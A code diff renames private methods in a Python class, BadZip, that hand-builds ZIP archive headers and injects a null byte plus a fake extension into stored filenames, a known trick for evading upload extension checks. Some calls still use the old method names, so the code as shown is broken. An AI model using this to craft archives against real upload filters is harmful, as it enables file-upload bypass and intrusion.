@@ -26,33 +26,33 @@ class BadZip:
             self.__save_zip(output_fname, zip_file, verbose=True)
 
 
-    def __get_null_byte_injected_fname(self, fname: str, ext: str) -> str:
+    def _get_null_byte_injected_fname(self, fname: str, ext: str) -> str:
         if not "." in ext:
             ext = '.' + ext
         return fname + f'\x00{ext}'
 
 
-    def __get_crc32(self, content: str) -> bytes:
+    def _get_crc32(self, content: str) -> bytes:
         crc32  = zlib.crc32(content)
         return struct.pack('<L', crc32)
 
 
-    def __get_uncompressed_size(self, content: str) -> bytes:
+    def _get_uncompressed_size(self, content: str) -> bytes:
         return struct.pack('<L', len(content))
 
 
-    def __get_compressed_size(self, content: str, compression: bool=True) -> bytes:
+    def _get_compressed_size(self, content: str, compression: bool=True) -> bytes:
         if not compression:
             return self.__get_uncompressed_size(content)
         else:
             pass # TODO: add compression
     
 
-    def __get_fname_len(self, fname: str) -> bytes:
+    def _get_fname_len(self, fname: str) -> bytes:
         return struct.pack('<H', len(fname))
 
 
-    def __create_local_file_header(self) -> bytes:
+    def _create_local_file_header(self) -> bytes:
         local_file_header = [
             b'\x50\x4b\x03\x04', # Signature
             b'\x0a\x00',         # Version needed to extract
@@ -71,7 +71,7 @@ class BadZip:
         return b''.join(local_file_header)
 
 
-    def __create_central_directory_header(self) -> bytes:
+    def _create_central_directory_header(self) -> bytes:
         central_directory_header = [
             b'\x50\x4b\x01\x02', # Signature
             b'\x1e\x03',         # Version made by
@@ -95,7 +95,7 @@ class BadZip:
         return b''.join(central_directory_header)
 
 
-    def __create_end_of_central_directory_header(self, lfh_size: bytes, cdh_size: bytes) -> bytes:
+    def _create_end_of_central_directory_header(self, lfh_size: bytes, cdh_size: bytes) -> bytes:
         end_of_central_directory = [
             b'\x50\x4b\x05\x06', # Signature
             b'\x00\x00',         # Number of this disk
@@ -109,7 +109,7 @@ class BadZip:
         return b''.join(end_of_central_directory)
     
     
-    def __save_zip(self, output_fname: str, content: bytes, verbose=False) -> None:
+    def _save_zip(self, output_fname: str, content: bytes, verbose=False) -> None:
         with open(output_fname, 'wb') as file:
             file.write(content)
 
